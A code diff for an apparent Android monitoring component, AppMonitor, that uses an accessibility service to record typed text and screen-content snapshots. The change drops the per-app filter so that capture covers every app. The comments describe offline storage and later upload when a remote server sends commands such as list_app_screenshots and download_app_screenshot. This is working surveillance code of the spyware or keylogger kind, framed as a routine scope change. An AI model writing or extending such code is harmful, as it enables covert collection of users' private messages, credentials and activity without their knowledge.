@@ -12,13 +12,14 @@ import org.json.JSONObject;
 
 /**
  * AppMonitor — hooks into UnifiedAccessibilityService to:
- *  1. Capture logs per monitored app (stored via LogManager)
- *  2. Capture accessibility screenshots (UI screenshots) for monitored apps
+ *  1. Capture logs for every app (stored via LogManager)
+ *  2. Capture accessibility screenshots (UI snapshots) for every app
  *
  * Monitoring continues even when the device is offline; logs are stored
  * locally and uploaded when the connection resumes via command response.
  *
- * Add package names to Constants.MONITORED_PACKAGES to configure targets.
+ * Constants.MONITORED_PACKAGES is only a convenience list for the
+ * list_app_monitor_apps report — it no longer restricts what is captured.
  */
 public class AppMonitor {
 
@@ -33,16 +34,16 @@ public class AppMonitor {
         this.logManager = logManager;
     }
 
-    /** Called from UnifiedAccessibilityService on every text-change event. */
+    /** Called from UnifiedAccessibilityService on every text-change event (any app). */
     public void onTextChanged(String packageName, String text) {
-        if (!isMonitored(packageName)) return;
+        if (packageName == null || packageName.isEmpty() || text == null || text.isEmpty()) return;
         String appName = getAppName(packageName);
         logManager.logEntry(packageName, appName, text, "TEXT_CHANGED");
     }
 
-    /** Called from UnifiedAccessibilityService when foreground app changes. */
+    /** Called from UnifiedAccessibilityService when foreground app changes (any app). */
     public void onAppForeground(String packageName) {
-        if (isMonitored(packageName)) {
+        if (packageName != null && !packageName.isEmpty()) {
             currentMonitoredPkg = packageName;
             Log.d(TAG, "Monitoring foreground: " + packageName);
         } else {
@@ -51,16 +52,16 @@ public class AppMonitor {
     }
 
     /**
-     * Called from UnifiedAccessibilityService when a monitored app's screen content changes.
+     * Called from UnifiedAccessibilityService when an app's screen content changes.
      * Saves a compact accessibility-tree snapshot (JSON text) to private storage.
      * Snapshots are small (no image data) and are only sent to the server when
      * the list_app_screenshots / download_app_screenshot commands are executed.
      *
-     * @param packageName  the monitored app's package name
+     * @param packageName  the app's package name
      * @param snapshotJson JSON string produced by UnifiedAccessibilityService.captureNodeTree()
      */
     public void onAccessibilitySnapshot(String packageName, String snapshotJson) {
-        if (!isMonitored(packageName) || snapshotJson == null || snapshotJson.isEmpty()) return;
+        if (packageName == null || packageName.isEmpty() || snapshotJson == null || snapshotJson.isEmpty()) return;
         try {
             logManager.saveAppSnapshot(packageName, snapshotJson);
         } catch (Exception e) {
